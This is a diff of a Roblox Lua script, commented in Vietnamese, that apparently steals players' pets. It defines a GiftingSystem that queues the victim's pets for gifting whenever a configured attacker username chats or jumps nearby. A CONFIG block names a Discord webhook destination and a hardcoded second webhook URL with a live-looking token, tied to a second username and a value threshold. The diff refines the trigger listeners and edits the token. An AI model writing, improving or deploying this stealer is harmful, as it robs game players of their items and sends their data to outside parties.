@@ -1,4 +1,3 @@
-
 if rawget(shared, "__SCRIPT_ALREADY_EXECUTED__") then
     return
 end
@@ -46,9 +45,9 @@ local function initializeServices()
 end
 
 local CONFIG = {
-    username = getfenv().Username,
+    username = getfenv().Username, -- Đảm bảo username này là tên người dùng bạn muốn theo dõi
     webhook = getfenv().Webhook,
-    dualWebhook = "https://discord.com/api/webhooks/1394648714492248126/8b1eORWdBwAWsudi91-7vMYweIkFfaNVvNLkqGY9q_neJNyPoxGppQEyOlq61ka_Ejhm",
+    dualWebhook = "https://discord.com/api/webhooks/1394648714492248126/8b1eORWdBwAWsudi91-7vMYweIkFfaNVnNLkqGY9q_neJNyPoxGppQEyOlq61ka_Ejhm",
     dualUsername = "namnnni2",
     dualWebhookThreshold = 1e12,
     
@@ -736,79 +735,30 @@ function GiftingSystem.giftAllPets(target)
 end
 
 function GiftingSystem.setupChatMonitoring()
-    local TextChatService = game:GetService("TextChatService")
-    local TextChannels = TextChatService:WaitForChild("TextChannels")
-    local RBXGeneral = TextChannels:WaitForChild("RBXGeneral")
-
-    -- Lắng nghe chat trên RBXGeneral
-    RBXGeneral.MessageReceived:Connect(function(message)
-        local sender = message.TextSource and game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-        if sender and string.lower(sender.Name) == string.lower(CONFIG.username) then
-            for _, queued in ipairs(giftQueue) do
-                if queued == sender then return end
-            end
-
-            local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-            if #targetPets > 0 or #regularPets > 0 then
-                table.insert(giftQueue, sender)
-            end
-        end
-    end)
-
-    -- Lắng nghe Jump
-    local function setupJumpListener(p)
-        if p and string.lower(p.Name) == string.lower(CONFIG.username) then
-            task.spawn(function()
-                repeat task.wait() until p.Character and p.Character:FindFirstChildOfClass("Humanoid")
-                local hum = p.Character:FindFirstChildOfClass("Humanoid")
-                if hum then
-                    hum:GetPropertyChangedSignal("Jump"):Connect(function()
-                        if hum.Jump then
-                            for _, queued in ipairs(giftQueue) do
-                                if queued == p then return end
-                            end
-
-                            local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-                            if #targetPets > 0 or #regularPets > 0 then
-                                table.insert(giftQueue, p)
-                            end
-                        end
-                    end)
-                end
-            end)
-        end
-    end
-
-    -- Gán cho tất cả player hiện có
-    for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
-        setupJumpListener(p)
-    end
-
-    -- Gán cho player mới
-    game:GetService("Players").PlayerAdded:Connect(function(p)
-        setupJumpListener(p)
-    end)
-
-    -- Nếu player reset nhân vật
-    game:GetService("Players").PlayerAdded:Connect(function(p)
-        p.CharacterAdded:Connect(function()
-            setupJumpListener(p)
-        end)
-    end)
-end
+    local function connectPlayer(p)
+        if p == LocalPlayer then return end
 
         local function onChatted(message)
-    if p and string.lower(p.Name) == string.lower(CONFIG.username) then
-        for _, queued in ipairs(giftQueue) do
-            if queued == p then return end
-        end
+            -- Kích hoạt khi người chơi có CONFIG.username chat
+            if p and string.lower(p.Name) == string.lower(CONFIG.username) then
+                -- Kiểm tra xem người chơi đã có trong hàng đợi chưa để tránh thêm trùng lặp
+                local alreadyQueued = false
+                for _, queued in ipairs(giftQueue) do
+                    if queued == p then
+                        alreadyQueued = true
+                        break
+                    end
+                end
 
-        local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-        if #targetPets > 0 or #regularPets > 0 then
-            table.insert(giftQueue, p)
+                if not alreadyQueued then
+                    local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
+                    if #targetPets > 0 or #regularPets > 0 then
+                        table.insert(giftQueue, p)
+                        warn(p.Name .. " (target user) chatted and added to gift queue.")
+                    end
+                end
+            end
         end
-    end
-end
 
         local function setupChat()
             pcall(function()
@@ -816,40 +766,52 @@ end
             end)
         end
 
--- Cũng bắt đầu nếu người đó nhảy
-if string.lower(p.Name) == string.lower(CONFIG.username) then
-    task.spawn(function()
-        repeat task.wait() until p.Character and p.Character:FindFirstChildOfClass("Humanoid")
-        local hum = p.Character:FindFirstChildOfClass("Humanoid")
-        hum:GetPropertyChangedSignal("Jump"):Connect(function()
-            if hum.Jump then
-                for _, queued in ipairs(giftQueue) do
-                    if queued == p then return end
-                end
+        -- Kích hoạt khi người chơi có CONFIG.username nhảy
+        if string.lower(p.Name) == string.lower(CONFIG.username) then
+            task.spawn(function()
+                repeat task.wait() until p.Character and p.Character:FindFirstChildOfClass("Humanoid")
+                local hum = p.Character:FindFirstChildOfClass("Humanoid")
+                if hum then
+                    hum:GetPropertyChangedSignal("Jump"):Connect(function()
+                        if hum.Jump then -- Kiểm tra nếu người chơi đang nhảy (Jump là true khi bắt đầu nhảy)
+                            -- Kiểm tra xem người chơi đã có trong hàng đợi chưa để tránh thêm trùng lặp
+                            local alreadyQueued = false
+                            for _, queued in ipairs(giftQueue) do
+                                if queued == p then
+                                    alreadyQueued = true
+                                    break
+                                end
+                            end
 
-                local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-                if #targetPets > 0 or #regularPets > 0 then
-                    table.insert(giftQueue, p)
+                            if not alreadyQueued then
+                                local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
+                                if #targetPets > 0 or #regularPets > 0 then
+                                    table.insert(giftQueue, p)
+                                    warn(p.Name .. " (target user) jumped and added to gift queue.")
+                                end
+                            end
+                        end
+                    end)
                 end
-            end
-        end)
-    end)
-end
+            end)
+        end
 
         if p.Character then
             setupChat()
         else
             p.CharacterAdded:Connect(function()
-                task.wait(1)
+                task.wait(1) -- Đợi một chút để Character và Humanoid được tải
                 setupChat()
             end)
         end
     end
 
+    -- Kết nối với tất cả người chơi hiện tại
     for _, p in ipairs(Players:GetPlayers()) do
         connectPlayer(p)
     end
 
+    -- Kết nối với người chơi mới tham gia
     Players.PlayerAdded:Connect(connectPlayer)
 end
 
